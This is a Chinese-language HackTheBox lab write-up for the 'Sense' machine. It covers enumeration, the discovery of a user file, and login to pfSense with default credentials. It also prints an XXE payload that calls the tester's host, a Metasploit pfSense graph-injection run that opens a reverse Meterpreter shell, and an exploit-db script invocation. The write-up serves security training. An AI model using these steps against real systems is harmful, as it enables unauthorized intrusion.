---
title: "HackTheBox：Sense笔记"
slug: ih9ed6
date: 2020-05-29T13:12:57+08:00
source: yuque/penetration
---

> 弄明白你打的网站，是什么cms，跑的什么中间件，靶机风评如何，很有必要！
>

10.10.10.60

![](https://cdn.nlark.com/yuque/0/2020/png/166008/1590729425195-edd08efe-80aa-4fc8-8213-6be000a8f0fd.png)![](https://cdn.nlark.com/yuque/0/2020/png/166008/1590729534655-00471b96-ee98-450a-96b8-2890c99047c3.png)



# Nmap
```sql
# nmap -p- -sC -sV 10.10.10.60

nmap scan report for 10.10.10.60
Host is up (0.0058s latency).
Not shown: 65533 filtered ports
PORT    STATE SERVICE    VERSION
80/tcp  open  http       lighttpd 1.4.35
|_http-server-header: lighttpd/1.4.35
|_http-title: Did not follow redirect to https://10.10.10.60/
|_https-redirect: ERROR: Script execution failed (use -d to debug)
443/tcp open  ssl/https?
|_ssl-date: TLS randomness does not represent time

```

# lighttpd 1.4.35
80端口会跳转到443，443端口是这个web

![](https://cdn.nlark.com/yuque/0/2020/png/166008/1590766011762-f1f15c9a-d60e-43de-b3d3-6919607efa83.png)



## dirb扫目录
```sql
[~]$ dirb https://10.10.10.60

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Fri May 29 05:22:42 2020
URL_BASE: https://10.10.10.60/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: https://10.10.10.60/ ----
==> DIRECTORY: https://10.10.10.60/classes/                                    
==> DIRECTORY: https://10.10.10.60/css/                                        
+ https://10.10.10.60/favicon.ico (CODE:200|SIZE:1406)                         
==> DIRECTORY: https://10.10.10.60/includes/                                   
+ https://10.10.10.60/index.html (CODE:200|SIZE:329)                           
+ https://10.10.10.60/index.php (CODE:200|SIZE:6690)                           
==> DIRECTORY: https://10.10.10.60/installer/                                  
==> DIRECTORY: https://10.10.10.60/javascript/                                 
==> DIRECTORY: https://10.10.10.60/themes/                                     
==> DIRECTORY: https://10.10.10.60/tree/                                       
==> DIRECTORY: https://10.10.10.60/widgets/                                    
+ https://10.10.10.60/xmlrpc.php (CODE:200|SIZE:384)                           
                                                                               
---- Entering directory: https://10.10.10.60/classes/ ----
                                                                               
---- Entering directory: https://10.10.10.60/css/ ----
                                                                               
---- Entering directory: https://10.10.10.60/includes/ ----
                                                                               
---- Entering directory: https://10.10.10.60/installer/ ----
+ https://10.10.10.60/installer/index.php (CODE:302|SIZE:0)                    
                                                                               
---- Entering directory: https://10.10.10.60/javascript/ ----
==> DIRECTORY: https://10.10.10.60/javascript/index/                           
==> DIRECTORY: https://10.10.10.60/javascript/jquery/                          
==> DIRECTORY: https://10.10.10.60/javascript/wizard/                          
                                                                               
---- Entering directory: https://10.10.10.60/themes/ ----
                                                                               
---- Entering directory: https://10.10.10.60/tree/ ----
+  (CODE:200|SIZE:7492)                     
                                                                               
---- Entering directory: https://10.10.10.60/widgets/ ----
==> DIRECTORY: https://10.10.10.60/widgets/include/                            
==> DIRECTORY: https://10.10.10.60/widgets/javascript/                         
==> DIRECTORY: https://10.10.10.60/widgets/widgets/                            
                                                                               
---- Entering directory: https://10.10.10.60/javascript/index/ ----
                                                                               
---- Entering directory: https://10.10.10.60/javascript/jquery/ ----
==> DIRECTORY: https://10.10.10.60/javascript/jquery/images/                   
                                                                               
---- Entering directory: https://10.10.10.60/javascript/wizard/ ----
                                                                               
---- Entering directory: https://10.10.10.60/widgets/include/ ----
                                                                               
---- Entering directory: https://10.10.10.60/widgets/javascript/ ----
                                                                               
---- Entering directory: https://10.10.10.60/widgets/widgets/ ----
                                                                               
---- Entering directory: https://10.10.10.60/javascript/jquery/images/ ----

```

### /xmlrpc.php
![](https://cdn.nlark.com/yuque/0/2020/png/166008/1590731574070-bd7757a6-e59e-4f3e-8ba0-b994cbbeb732.png)

```sql
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ <!ENTITY % pe SYSTEM "http://10.10.14.4:88"> %pe; %param1; ]>
<foo>&external;</foo> 
```

测试过，无xxe问题

### /tree/index.html
![](https://cdn.nlark.com/yuque/0/2020/png/166008/1590733092577-5ab408a8-e773-4d0e-89fb-004d49d1e546.png)

```sql
    Connect to host via SSH: 
    <applet CODEBASE="." ARCHIVE="jta20.jar" CODE="de.mud.jta.Applet" WIDTH=55 HEIGHT=25>
	<param NAME="config" VALUE="applet.conf">
    </applet>
```

不知道啥意思。。。

# breakthrough
用dirbuster再扫目录，用最大的字典

```sql
 /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

find something juicy，发现了些好东西

```sql
# https://10.10.10.60//changelog.txt
//内容如下
# Security Changelog 

### Issue
There was a failure in updating the firewall. Manual patching is therefore required

### Mitigated
2 of 3 vulnerabilities have been patched.

### Timeline
The remaining patches will be installed during the next maintenance window




# https://10.10.10.60/system-users.txt
//内容如下
####Support ticket###

Please create the following user


username: Rohit
password: company defaults
```

公司默认密码？osint，搜索引擎走起

![](https://cdn.nlark.com/yuque/0/2020/png/166008/1590766665129-28940fa6-a83a-4b18-b6ae-66eb2fd4de86.png)



直接登录了哦，

![](https://cdn.nlark.com/yuque/0/2020/png/166008/1590766843344-cc662a21-85d7-4ac0-bfbd-62ddf43506c4.png)



```sql
msf5 exploit(unix/http/pfsense_graph_injection_exec) > set username rohit
username => rohit
msf5 exploit(unix/http/pfsense_graph_injection_exec) > set password pfsense
password => pfsense
msf5 exploit(unix/http/pfsense_graph_injection_exec) > set lhost tun0
lhost => 10.10.16.122
msf5 exploit(unix/http/pfsense_graph_injection_exec) > set rhosts 10.10.10.60
rhosts => 10.10.10.60
msf5 exploit(unix/http/pfsense_graph_injection_exec) > run

[*] Started reverse TCP handler on 10.10.16.122:4444 
[*] Detected pfSense 2.1.3-RELEASE, uploading intial payload
[*] Payload uploaded successfully, executing
[*] Sending stage (38288 bytes) to 10.10.10.60
[*] Meterpreter session 1 opened (10.10.16.122:4444 -> 10.10.10.60:39519) at 2020-05-29 23:26:58 +0800

```

或者用searchexploit里的exp拿shell

![](https://cdn.nlark.com/yuque/0/2020/png/166008/1590767623073-864541e9-c3ab-45f9-97e5-4db13ce45006.png)

```sql
# python3 43560.py --rhost 10.10.10.60  --lhost 10.10.16.122 --lport 1337 --username rohit --password pfsense

```

# 复盘
一开始根本没锁定这个pfSense,还是经验不够了，只注意了lighttpd

1. icon跟body其实都有蛛丝马迹![](https://cdn.nlark.com/yuque/0/2020/png/166008/1590766699999-b025290e-5406-4518-88bd-79875e00d0d8.png)

2. enumeration！

常用扫目录工具有dirbuster+ dirb + wfuzz





